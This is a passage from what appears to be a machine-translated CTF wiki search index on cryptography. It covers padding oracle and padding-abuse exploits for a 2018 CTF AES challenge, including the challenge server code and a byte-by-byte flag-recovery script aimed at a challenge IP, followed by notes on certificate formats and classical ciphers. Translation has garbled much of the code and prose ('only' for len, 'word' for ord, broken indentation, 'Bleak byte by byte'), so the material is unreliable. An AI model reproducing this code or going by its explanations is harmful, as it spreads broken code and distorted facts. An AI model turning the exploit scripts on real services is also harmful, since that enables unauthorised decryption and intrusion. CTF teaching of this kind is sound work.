+ iv\n\n                send_data(payload)\n\n                length, data = recv_data()\n\n                if 'Looks' not in data:\n\n                    # success\n\nplain0 + = chr (j)\n                    tag = True\n\n                    break\n\n            if not tag:\n\n                break\n\n        # means the last byte is ok\n\n        if plain0 != '':\n\n            break\n\n    plain0 += chr(iv_last ^ last_byte)\n\n    return plain0\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#decrypt-the-specified-plaintext","title":"Decrypt the specified plaintext","text":"<p>This is relatively simple, we hope to use this to get the ciphertext of <code>gimme_flag</code></p> <pre><code>    print('get the cipher of flag')\n\n    gemmi_iv1 = xor(pad('gimme_flag'), plain0)\n\n    gemmi_c1 = xor(gemmi_iv1, cipher0)\n\n    payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1\n\n    send_data('gimme_flag')\n\n    send_data(payload)\n\n    flag_len, flag_cipher = recv_data()\n</code></pre> <p>Where plain0 and cipher0 are the clear ciphertext pairs we obtained for AES encryption, excluding the two exclusive ORs before and after.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#decrypt-flag","title":"Decrypt flag","text":"<p>This point is actually achieved by the function of decrypting any encrypted block, as follows</p> <pre><code>    print('the flag cipher is ' + flag_cipher.encode('hex'))\n\n    flag_cipher = split_by(flag_cipher, 16)\n\n\n\n    print('decrypt the blocks one by one')\n\n    plain = ''\n\n    for i in range(len(flag_cipher) - 1):\n\n        print('block: ' + str(i))\n\n        if i == 0:\n\n            plain += dec_block(flag_cipher[i], flag_cipher[i + 1])\n\n        else:\n\niv = plain [-16:]\n            cipher = xor(xor(iv, flag_cipher[i + 1]), flag_cipher[i])\n\n            plain += dec_block(iv, cipher)\n\n            pass\n\n        print('now plain: ' + plain)\n\n    print plain\n</code></pre> <p>Think about why the ciphertext operation after the second block will be different.</p> <p>The complete code references the ctf-challenge repository.</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#references","title":"References","text":"<ul> <li>[Packet Encryption Mode] (https://en.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5% E4%BD%9C%E6%A8%A1%E5%BC%8F)</li> <li> <p>https://en.wikipedia.org/wiki/Padding_oracle_attack</p> </li> <li> <p>http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf</p> </li> <li> <p>https://ctftime.org/writeup/7975</p> </li> <li> <p>https://ctftime.org/writeup/7974</p> </li> </ul>"},{"location":"crypto/blockcipher/mode/padding/","title":"Fill rule","text":"<p>As we said before, in packet encryption, the length of the plaintext often does not meet the requirements, and padding is required. How to padding has a lot of rules.</p> <p>The common [fill rule] (https://www.di-mgt.com.au/cryptopad.html) is as follows. ** It should be noted that even if the length of the message is an integer multiple of the block size, it still needs to be filled. **</p> <p>In general, if Padding is found to be incorrect after decryption, an exception is often thrown. We can therefore know if Paddig is correct.</p>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding","title":"Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)","text":"<p>Examples are as follows</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n\n(IN HEX)           66 6F 72 05 05 05 05 05\n\nKEY              = 01 23 45 67 89 AB CD EF\n\nDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding","title":"Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)","text":"<p>Examples are as follows</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n\n(IN HEX)           66 6F 72 80 00 00 00 00\n\nKEY              = 01 23 45 67 89 AB CD EF\n\nDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40\n</code></pre> <p>This is actually the same as the padding of md5 and sha1.</p>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes","title":"Pad with zeroes except make the last byte equal to the number of padding bytes","text":"<p>Examples are as follows</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n\n(IN HEX)           66 6f 72 00 00 00 00 05\n\nKEY              = 01 23 45 67 89 AB CD EF\n\nDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zero-null-characters","title":"Pad with zero (null) characters","text":"<p>Examples are as follows</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n\n(IN HEX)           66 6f 72 00 00 00 00 00\n\nKEY              = 01 23 45 67 89 AB CD EF\n\nDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-spaces","title":"Pad with spaces","text":"<p>Examples are as follows</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n\n(IN HEX)           66 6f 72 20 20 20 20 20\n\nKEY              = 01 23 45 67 89 AB CD EF\n\nDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#2018-shanghai-university-student-network-security-competition-aessss","title":"2018 Shanghai University Student Network Security Competition aessss","text":"<p>Sometimes you can attack some improperly used Padding. Here is a topic of the 2018 Shanghai University Student Network Security Competition:</p> <p>The title script is as follows:</p> <pre><code>import random\n\nimport sys\n\nimport string\n\nfrom hashlib import sha256\n\nimport SocketServer\n\nfrom Crypto.Cipher import AES\n\nfrom secret import FLAG, IV, KEY\n\n\n\n\n\nclass Task(SocketServer.BaseRequestHandler):\n\n    def proof_of_work(self):\n\n        proof = ''.join(\n\n            [random.choice(string.ascii_letters+string.digits) for _ in xrange(20)])\n\n        # print proof\n\n        digest = sha256(proof).hexdigest()\n\n        self.request.send(\"sha256(XXXX+%s) == %s\\n\" % (proof[4:], digest))\n\n        self.request.send('Give me XXXX:')\n\n        x = self.request.recv(10)\n\n        x = x.strip()\n\n        if len(x) != 4 or sha256(x+proof[4:]).hexdigest() != digest:\n\n            return False\n\n        return True\n\n\n\n    def pad(self, s):\n\ns + = (256 - only (s)) * chr (256 - only (s))\n        ret = ['\\x00' for _ in range(256)]\n\n        for index, pos in enumerate(self.s_box):\n\nret [pos] = s [index]\n        return ''.join(ret)\n\n\n\ndef unpad (self, s):\n        ret = ['\\x00' for _ in range(256)]\n\n        for index, pos in enumerate(self.invs_box):\n\nret [pos] = s [index]\nreturn &amp;#39;&amp;#39; .join (right [0: -word (right [-1])])\n\n\n    s_box = [\n\n        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,\n\n        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,\n\n        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,\n\n        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,\n\n        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,\n\n        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,\n\n        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,\n\n        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,\n\n        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,\n\n        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,\n\n        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,\n\n        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,\n\n        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,\n\n        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,\n\n        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,\n\n        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16\n\n    ]\n\n\n    invs_box = [\n\n        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,\n\n        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,\n\n        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,\n\n        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,\n\n        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,\n\n        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,\n\n        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,\n\n        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,\n\n        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,\n\n        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,\n\n        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,\n\n        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,\n\n        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,\n\n        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,\n\n        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,\n\n        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D\n\n    ]\n\n\n\n    def encrypt(self, msg):\n\n        cipher = AES.new(KEY, AES.MODE_CBC, IV)\n\n        return cipher.encrypt(msg).encode('hex')\n\n\n\n    def handle(self):\n\n        if not self.proof_of_work():\n\n            return\n\n        self.request.settimeout(15)\n\n        req = self.request\n\nflag_len = len (FLAG)\n        assert(flag_len == 33)\n\n        self.flag = self.pad(FLAG)\n\n        assert(len(self.flag) == 256)\n\n\n\n        while True:\n\n            req.sendall(\n\n                'Welcome to AES(WXH) encrypt system.\\n1. get encrypted flag.\\n2. pad flag.\\n3.Do some encrypt.\\nYour choice:')\n\n            cmd = req.recv(2).strip()\n\n            try:\n\n                cmd = int(cmd)\n\n            except ValueError:\n\n                cmd = 0\n\n            if cmd == 1:\n\n                enc = self.encrypt(self.flag)\n\n                req.sendall('Here is the encrypted flag: 0x%s\\n' % enc)\n\nelif cmd == 2:\n                req.sendall('Pad me something:')\n\nself.flag = self.unpad (self.flag) [\n                    :flag_len] + req.recv(1024).strip()\n\n                assert(len(self.flag) &lt;= 256)\n\n                self.flag = self.pad(self.flag)\n\n                req.sendall('Done.\\n')\n\nelif cmd == 3:\n                req.sendall('What do you want to encrypt:')\n\n                msg = self.pad(req.recv(1024).strip())\n\nassert (len (msg) &amp;lt;= 256)\n                enc = self.encrypt(msg)\n\n                req.sendall('Here is the encrypted message: 0x%s\\n' % enc)\n\n            else:\n\n                req.sendall('Do not lose heart\uff5e \uff01% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!')\n\n                req.close()\n\n                return\n\n\n\n\n\nclass ThreadedServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):\n\n    pass\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    HOST, PORT = '0.0.0.0', 23333\n\n    print 'Run in port:23333'\n\n    server = ThreadedServer((HOST, PORT), Task)\n\n    server.allow_reuse_address = True\n\n    server.serve_forever()\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#analysis","title":"Analysis","text":"<p>The problem with this problem is in padding. Since there are less than 256 bits to padding, the padding bytes are the missing bytes, but if the plaintext is 256 bytes, then padding is not performed according to the code logic:</p> <pre><code>def pad(self, s):\n\ns + = (256 - only (s)) * chr (256 - only (s))\n        ret = ['\\x00' for _ in range(256)]\n\n        for index, pos in enumerate(self.s_box):\n\nret [pos] = s [index]\n        return ''.join(ret)\n</code></pre> <p>The biggest problem is on the unpad, which is not checked by the unpad, only the last byte is used to determine the number of bytes to fill.</p> <pre><code>def unpad (self, s):\n        ret = ['\\x00' for _ in range(256)]\n\n        for index, pos in enumerate(self.invs_box):\n\nret [pos] = s [index]\nreturn &amp;#39;&amp;#39; .join (right [0: -word (right [-1])])\n</code></pre> <p>We can control the number of padding bytes removed by tampering with the last byte.</p>"},{"location":"crypto/blockcipher/mode/padding/#use","title":"Use","text":"<ol> <li> <p>Select choice2 and append <code>256-33 = 223</code> bytes so that the current flag does not need to be filled. The last byte appended is set to <code>chr(256-32)</code>.</p> </li> <li> <p>The server appends our information to the flag and performs s box substitution, and the result is assigned to the flag variable in the class.</p> </li> <li> <p>We choose choice2 again, here we need to append, the server will take the flag variable in the class for reverse S box replacement and unpad, so according to this unpad algorithm will be the next 224 bytes as the padding removed, the plaintext is left The first 32 bits of the real flag.</p> </li> <li> <p>We enter a character i at this time, then the object encrypted at this time is <code>flag[:32]+i</code>.</p> </li> <li> <p>Select choice1 to encrypt the current flag, control i to blast, and if the resulting ciphertext is the same as the original flag encrypted ciphertext, the last byte of the flag is obtained.</p> </li> <li> <p>Bleak byte by byte until all flags are obtained.</p> </li> </ol> <p>Exp is as follows:</p> <pre><code># -*- coding: utf-8 -*-\n\nfrom hashlib import sha256\n\nimport socket\n\nimport string\n\nimport itertools\n\nHOST='106.75.13.64'\n\nPORT=54321\n\nsock = socket.socket (socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\ndef brute_force (pad, shavalue):\n    for str in itertools.product(string.ascii_letters + string.digits, repeat=4):\n\n        str=''.join(str)\n\nif sha256 (str + pad) .hexdigest () == shavalue:\n            print str\n\n            return str\n\ndef choice1():\n\n    sock.send(\"1\\n\")\n\n    result=sock.recv(1024).strip()[30:]\n\n    sock.recv(1024).strip()\n\n    return result\n\ndef choice2(pad):\n\n    sock.send(\"2\\n\")\n\n    sock.recv(1024).strip()\n\n    sock.send(pad+\"\\n\")\n\n    sock.recv(1024).strip()\n\n    sock.recv(1024).strip()\n\ndef choice3(str):\n\n    sock.send(\"3\\n\")\n\n    sock.recv(1024).strip()\n\n    sock.send(str+\"\\n\")\n\n    result=sock.recv(1024).strip()[33:]\n\n    sock.recv(1024).strip()\n\n    return result\n\ncontent = sock.recv(1024).strip()\n\npad=content[12:12+16]\n\nhash=content[33:33+64]\n\nsock.recv(1024).strip()\n\nsock.send(str(brute_force(pad,hash))+\"\\n\")\n\nprint sock.recv(1024).strip()\n\nflag_enc=choice1()\n\nflag=\"\"\n\nfor i in range(33):\n\n    a = ''.join(['a' for _ in range(223)])\n\n    a = a[:-1] + chr(224+i)\n\n    for c in string.printable:\n\n        print c+flag\n\n        choice2(a)\n\n        choice2(c+flag)\n\n        if choice1() == flag_enc:\n\n            flag=c+flag\n\n            print \"success:\",flag\n\n            break\n</code></pre> <p>flag{H4ve_fun_w1th_p4d_and_unp4d} </p>"},{"location":"crypto/blockcipher/mode/pcbc/","title":"PCBC","text":"<p>The full name of PCBC is Plaintext cipher-block chaining. Also known as Propagating cipher-block chaining.</p>"},{"location":"crypto/blockcipher/mode/pcbc/#encryption","title":"Encryption","text":""},{"location":"crypto/blockcipher/mode/pcbc/#decryption","title":"decryption","text":""},{"location":"crypto/blockcipher/mode/pcbc/#features","title":"Features","text":"<ul> <li>The decryption process is difficult to parallelize</li> <li>Interchanging adjacent ciphertext blocks does not affect subsequent ciphertext blocks</li> </ul>"},{"location":"crypto/certificate/introduction/","title":"\u8bc1\u4e66\u683c\u5f0f","text":""},{"location":"crypto/certificate/introduction/#pem","title":"PEM","text":"<p>PEM is just ASN.1 data put between headers <code>-----BEGIN</code> and <code>-----END</code>, where ASN.1 is binary data with base64 encoding. There are valid PEM examples here on Wikipedia.</p> <p>With Python 3 and the PyCryptodome library, we could easily access a PEM file and extract data from it. For example, say we want to extract the modulus <code>n</code>:</p> <pre><code>#!/usr/bin/env python3\nfrom Crypto.PublicKey import RSA\n\nwith open(\"certificate.pem\",\"r\") as f:\n    key = RSA.import_key(f.read())\n    print(key.n)\n</code></pre>"},{"location":"crypto/certificate/introduction/#der","title":"DER","text":"<p>DER is a binary encoding method for data described by ASN.1. Certificates with the <code>.cer</code> or <code>.crt</code> extension usually contains DER formatted data, but Windows might also accept PEM formatted data.</p> <p>To work with a DER file, we could convert it to PEM using <code>openssl</code>:</p> <pre><code>openssl x509 -inform DER -in certificate.der &gt; certificate.pem\n</code></pre> <p>Now the problem is reduced to \"how to work with a PEM file\", so we could use the same Python code as the one in the PEM section.</p>"},{"location":"crypto/certificate/introduction/#additonal-format-conversion","title":"Additonal Format Conversion","text":"<pre><code>openssl x509 -outform der -in certificate.pem -out certificate.der\nopenssl x509 -inform der -in certificate.cer -out certificate.pem\n</code></pre>"},{"location":"crypto/certificate/introduction/#reference","title":"Reference","text":"<ol> <li>Attacking RSA for fun and CTF points \u2013 part 1</li> <li>What are the differences between .pem, .cer and .der?</li> </ol>"},{"location":"crypto/classical/introduction/","title":"Introduction to Classical Cryptography","text":"<p>In classical cryptography, we mainly introduce single-table alternative passwords, multi-table alternative passwords, and some other more interesting passwords.</p> <p>It is worth mentioning that in classical cryptography, the designer mainly considers the confidentiality of the message, so that only the person with the relevant key can decrypt the ciphertext to obtain the content of the message, and the integrity and non-repudiation of the message are not carried out. Too many considerations.</p> <ul> <li> <p>Expand reading</p> </li> <li> <p>[The coding and encryption of those brain holes in the CTF] (http://www.tuicool.com/articles/2E3INnm)</p> </li> <li>[History of Classical Cryptography] (http://www.oscca.gov.cn/sca/zxfw/2017-04/24/content_1011709.shtml)</li> <li>[Classical Password - Wikipedia] (https://en.wikipedia.org/wiki/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A2%BC)</li> </ul>"},{"location":"crypto/classical/monoalphabetic/","title":"Single table Substitution Cipher","text":""},{"location":"crypto/classical/monoalphabetic/#general-features","title":"General Features","text":"<p>In single-table replacement encryption, all encryption methods have almost one commonality, that is, the plaintext one-to-one correspondence. Therefore, there are generally two ways to crack</p> <ul> <li>In the case of a small key space, brute force</li> <li>Use word frequency analysis when the ciphertext length is long enough, http://quipqiup.com/</li> </ul> <p>When the key space is large enough and the ciphertext length is short enough, the cracking is more difficult.</p>"},{"location":"crypto/classical/monoalphabetic/#caesar-password","title":"Caesar Password","text":""},{"location":"crypto/classical/monoalphabetic/#principle","title":"Principle","text":"<p>When Caesar is encrypted, each letter in the plaintext is moved backward (or forward) by a fixed number (circular movement**) as ciphertext according to its order in the alphabet. For example, when the offset is shifted to the left by 3 (the key at decryption is 3):</p> <pre><code>Plaintext alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZ\nThe ciphertext alphabet: DEFGHIJKLMNOPQRSTUVWXYZABC\n</code></pre> <p>In use, the encryptor finds the location of each letter in the message that needs to be encrypted in the plaintext alphabet, and writes the corresponding letter in the ciphertext alphabet. The person who needs to decrypt is reversed according to the previously known key to get the original plaintext. E.g:</p> <pre><code>\u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\nSecret: WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ\n</code></pre> <p>Depending on the offset, there are also a number of specific Caesar password names**:</p> <ul> <li>Offset is 10: Avocat (A\u2192K)</li> <li>The offset is 13: [ROT13] (https://zh.wikipedia.org/wiki/ROT13)</li> <li>Offset -5: Cassis (K 6)</li> <li>Offset -6: Cassette (K 7)</li> </ul> <p>In addition, there is a key-based Caesar cipher Keyed Caesar. The basic principle is that ** use a key to convert each bit of the key into a number (generally converted into a number corresponding to the alphabet), and use this number as the key to encrypt each letter of the plaintext. **</p> <p>Here is an example of the XMan Phase I Summer Camp sharing the Kung Pao Chicken Crest Crypto 100.</p> <pre><code>Ciphertext: s0a6u3u1s0bv1a\nKey: guangtou\nOffset: 6, 20, 0, 13, 6, 19, 14, 20\nClear text: y0u6u3h1y0uj1u\n</code></pre>"},{"location":"crypto/classical/monoalphabetic/#_1","title":"\u7834","text":"<p>For Caesar passwords without keys, there are two ways to break the basics.</p> <ol> <li>Traverse 26 offsets for general conditions</li> <li>Using word frequency analysis, it is suitable for the case of long ciphertext.</li> </ol> <p>Among them, the first way can definitely get plaintext, while the second way does not necessarily get the correct plaintext.</p> <p>For a key-based Caesar cipher, it is generally necessary to know the corresponding key.</p>"},{"location":"crypto/classical/monoalphabetic/#tools","title":"Tools","text":"<p>Generally we have the following tools, of which JPK is more general.</p> <ul> <li>JPK, solvable with and without key</li> <li> <p>http://planetcalc.com/1434/</p> </li> <li> <p>http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</p> </li> </ul>"},{"location":"crypto/classical/monoalphabetic/#shift-password","title":"Shift password","text":"<p>Similar to the Caesars password, the difference is that shifting passwords not only handles letters, but also numbers and special characters, which are commonly used in ASCII tables. The way to crack it is also to traverse all the possibilities to get the possible results.</p>"},{"location":"crypto/classical/monoalphabetic/#atbash-cipher","title":"Atbash Cipher","text":""},{"location":"crypto/classical/monoalphabetic/#principle_1","title":"Principle","text":"<p>Atbash Cipher can actually be considered as a special case of a simple replacement password to be introduced below. It uses the last letter of the alphabet to represent the first letter, and the second to last letter represents the second letter. In the Roman alphabet, it appears like this:</p> <pre><code>Clear text: ABCDEFGHIJKLMNOPQRSTU VWXYZ\nCiphertext: ZYXWVUTSRQPONMLKJIHGF EDCBA\n</code></pre> <p>An example is given below:</p> <pre><code>\u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\n\u5bc6 \u6587 \uff1a gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt\n</code></pre>"},{"location":"crypto/classical/monoalphabetic/#_2","title":"\u7834","text":"<p>It can be seen that the key space is short enough, and when the ciphertext is long enough, it can still be solved by word frequency analysis.</p>"},{"location":"crypto/classical/monoalphabetic/#tools_1","title":"Tools","text":"<ul> <li>http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</li> </ul>"},{"location":"crypto/classical/monoalphabetic/#simple-replacement-password","title":"Simple replacement password","text":""},{"location":"crypto/classical/monoalphabetic/#principle_2","title":"Principle","text":"<p>When the Simple Substitution Cipher is encrypted, each plaintext letter is replaced with a letter that uniquely corresponds to it. The difference between it and the Caesar cipher is that the letters of its cipher alphabet are not simply shifted, but completely confusing, which makes it more difficult to crack than the Caesar cipher. such as:</p> <pre><code>Plain text: abcdefghijklmnopqrstuvwxyz\nKey letter: phqgiumeaylnofdxjkrcvstzwb\n</code></pre> <p>a corresponds to p, d corresponds to h, and so on.</p> <pre><code>\u660e\u6587\uff1athe quick brown fox jumps over the lazy dog\n\n\u5bc6 \u6587: those jvaql hkdtf udz yvoxr dsik those npbw gdm\n</code></pre> <p>When decrypting, we generally know the corresponding rules of each letter before we can decrypt it normally.</p>"},{"location":"crypto/classical/monoalphabetic/#_3","title":"\u7834","text":"<p>Since this encryption method results in all of its keys being 26!, it is almost impossible to use a violent solution. So we generally use word frequency analysis.</p>"},{"location":"crypto/classical/monoalphabetic/#tools_2","title":"Tools","text":"<ul> <li>http://quipqiup.com/</li> </ul>"},{"location":"crypto/classical/monoalphabetic/#affine-password","title":"affine password","text":""},{"location":"crypto/classical/monoalphabetic/#principle_3","title":"Principle","text":"<p>The cryptographic function of the affine password is E(x)=(ax+b)\\pmod m, where</p> <ul> <li>x indicates the number of plaintexts obtained by some encoding</li> <li>a and m are qualitative</li> <li>m is the number of letters in the encoding system.</li> </ul> <p>The decryption function is D(x)=a^{-1}(xb)\\pmod m, where a^{-1} is a at \\mathbb{Z}_{m} Multiplication inverse.</p> <p>Let's take the E(x) = (5x + 8) \\bmod 26 function as an example. The encrypted string is <code>AFFINE CIPHER</code>. Here we use the alphabet 26 letters as the encoding system.</p> <p>| \u660e\u6587      | A   | F   | F   | I   | N   | E   | C   | I   | P   | H   | E   | R   |</p> <p>| --------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |</p> <p>| x         | 0   | 5   | 5   | 8   | 13  | 4   | 2   | 8   | 15  | 7   | 4   | 17  |</p> <p>| $ y = 5x + 8 $ | 8 | 33 | 33 | 48 | 73 | 28 | 18 | 48 | 83 | 43 | 28 | 93 | | $ y  mod26 $ | 8 | 7 | 7 | 22 | 21 | 2 | 18 | 22 | 5 | 17 | 2 | 15 | | \u5bc6\u6587      | I   | H   | H   | W   | V   | C   | S   | W   | F   | R   | C   | P   |</p> <p>The corresponding encryption result is <code>IHHWVCSWFRCP</code>.</p> <p>For the decryption process, the normal decrypter has a and b, and can calculate a^{-1} to be 21, so its decryption function is D(x)=21(x-8)\\pmod {26} , Decrypt as follows</p> <p>| \u5bc6\u6587        | I    | H    | H   | W   | V   | C    | S   | W   | F   | R   | C    | P   |</p> <p>| ----------- | :--- | :--- | --- | --- | --- | ---- | --- | --- | --- | --- | ---- | --- |</p> <p>| $ y $ | 8 | 7 | 7 | 22 | 21 | 2 | 18 | 22 | 5 | 17 | 2 | 15 | | x=21(y-8) | 0    | -21  | -21 | 294 | 273 | -126 | 210 | 294 | -63 | 189 | -126 | 147 |</p> <p>| x\\mod26   | 0    | 5    | 5   | 8   | 13  | 4    | 2   | 8   | 15  | 7   | 4    | 17  |</p> <p>| \u660e\u6587        | A    | F    | F   | I   | N   | E    | C   | I   | P   | H   | E    | R   |</p> <p>It can be seen that it is characterized by only 26 English letters.</p>"},{"location":"crypto/classical/monoalphabetic/#_4","title":"\u7834","text":"<p>First of all, we can see that the affine password is different for any two different letters, and the ciphertext obtained by it is different, so it also has the most common features. When the ciphertext length is long enough, we can use the frequency analysis method to solve it.</p> <p>Second, we can consider how to attack the password. It can be seen that when a=1, the affine encryption is Caesar encryption. In general, when we use affine ciphers, the character set uses the alphabet, generally only 26 letters, and not more than 26 and 26 symbiotics.</p> <p>$$</p> <p>(26) = (2) non (13) = 12 $$</p> <p>Counting the offset of b, there is a total possible key space size.</p> <p>$$</p> <p>12 \\times 26 = 312</p> <p>$$</p> <p>In general, for this kind of password, we must at least attack the known part of the plaintext. A simple analysis is performed below.</p> <p>This kind of password is controlled by two parameters. If we know any one of them, then we can easily enumerate another parameter quickly to get the answer.</p> <p>However, suppose we already know the set of letters used, here we assume 26 letters, we have another way of decryption, we only need to know the two encrypted letters y_1, y_2 to decrypt. Then we can still know</p> <p>$$</p> <p>y_1=(ax_1+b)\\pmod{26} \\</p> <p>y_2=(ax_2+b)\\pmod{26}</p> <p>$$</p> <p>Two types of subtraction, available</p> <p>$$</p> <p>y_1-y_2=a(x_1-x_2)\\pmod{26}</p> <p>$$</p> <p>Here y_1,y_2 is known. If we know the two different characters x_1 and x_2 for the cipher text, then we can easily get a and then get 